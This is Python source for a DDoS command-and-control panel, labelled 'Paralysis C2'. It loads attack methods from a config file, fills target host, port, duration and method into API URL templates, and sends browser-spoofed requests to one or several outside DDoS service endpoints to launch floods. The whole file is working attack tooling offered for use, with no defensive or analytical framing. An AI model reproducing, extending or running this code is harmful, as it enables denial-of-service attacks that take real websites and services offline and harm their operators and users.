'''
Paralysis C2 source
written by Null
'''

import requests, json, os

from src.logging import *

class ApiConfig:
    methods = {}

    def make() -> None:
        '''
        Creates the API config file
        '''

        with open('assets/apis.json', 'w+') as fd:
            pass

    def load() -> None:
        '''
        Attempts to load the API config
        '''

        if not os.path.isfile('assets/methods.json'):
            logging.error('API config file not found, making one.')
            ApiConfig.make()

        with open('assets/methods.json') as fd:
            config = json.loads(fd.read())
        
        ApiConfig.methods = config

class Api():
    def __init__(self):
        self.headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "sec-gpc": "1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36"
        }
    
    def launch(self, api:str, host:str, port:str, time:str, method:str) -> bool:
        '''
        Sends the actual request
        '''
        logging.info(f'Launching attack on {host}:{port} using {method} for {time} seconds, using api {api}')

        url = api
        for key, value in [
                ('$(target)', host),
                ('$(port)', port),
                ('$(time)', time),
                ('$(method)', method)
            ]: url=url.replace(key, value)

        req = requests.get(url, headers=self.headers)
        return req.status_code == 200
    
    def send(self, host:str, port:str, time:str, method:str) -> bool:
        '''
        Sends a request to the DDoS API endpoint(s)
        '''

        info = ApiConfig.methods.get(method.lower())
        if not info:
            return False
        
        apis = info['api']
        if info['funnel']:
            for url in apis:
                self.launch(url, host, port, time, method)
        else:
            self.launch(apis[0], host, port, time, method)
        
        return True